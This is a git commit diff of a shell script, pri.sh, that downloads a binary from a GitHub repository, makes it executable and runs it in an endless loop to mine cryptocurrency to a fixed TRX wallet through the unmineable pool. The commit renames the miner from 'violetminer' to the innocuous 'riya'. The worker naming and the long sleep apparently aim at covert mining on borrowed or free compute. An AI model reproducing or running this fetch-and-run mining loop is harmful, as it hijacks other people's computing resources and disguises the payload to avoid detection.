1a43ab1d3e1ecb1dd54ae1b851e86ad30c43bf96
prathhub <88438190+prathhub@users.noreply.github.com>
2021-08-06 10:48:32 +0530

    Update pri.sh

--- pri.sh
+++ pri.sh
@@ -2,10 +2,10 @@
 POOL=rx.unmineable.com:3333
 WALLET=TRX:TYWmD5VqkvA9AT4Pcfgqx5asB8WC2cgodP
 WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#)
-wget https://github.com/prathhub/kaku/raw/main/violetminer
-chmod +x violetminer
+wget https://github.com/prathhub/kaku/raw/main/riya
+chmod +x riya
 while [ 1 ]; do
-./violetminer --algorithm chukwa_wrkz --pool $POOL --username $WALLET.$WORKER +50000 
+./riya --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
 sleep 5
 done
 sleep 999999999 
